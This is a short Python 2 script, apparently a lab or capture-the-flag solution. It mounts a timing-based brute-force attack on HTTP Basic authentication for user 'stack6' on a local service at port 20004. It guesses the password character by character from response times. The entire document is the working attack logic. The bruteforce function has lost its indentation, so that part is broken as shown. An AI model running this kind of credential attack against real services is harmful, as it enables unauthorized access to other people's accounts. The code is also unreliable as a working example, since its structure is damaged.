#!/usr/bin/python

from socket import *
from struct import *
import base64
import time
import string


def try_password(password):
    credentials = base64.b64encode("stack6:{0}".format(password))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("localhost", 20004))
    request = "GET / HTTP/1.0\r\n"
    request += "Authorization: Basic {0}\r\n".format(credentials)
    request += "\n"
    begin = time.time()
    s.send(request)
    response = s.recv(1024)
    end = time.time()
    s.close()
    return (end-begin, response)

def bruteforce():
password = ""
count = 3
i = 0
while i<16:
candidate = ""
others = 10000000
response = ""
for char in string.ascii_letters+string.digits:
(time, response) = try_password(password + char)
#print("trying {0}, reponse in {1}".format(char, time))
if "Unauthorized" not in response:
print("Eureka " + password + char)
return password + char
else:
if time < others:
candidate = char
others = time
password += candidate
print(password)
i += 1
passwd = bruteforce()
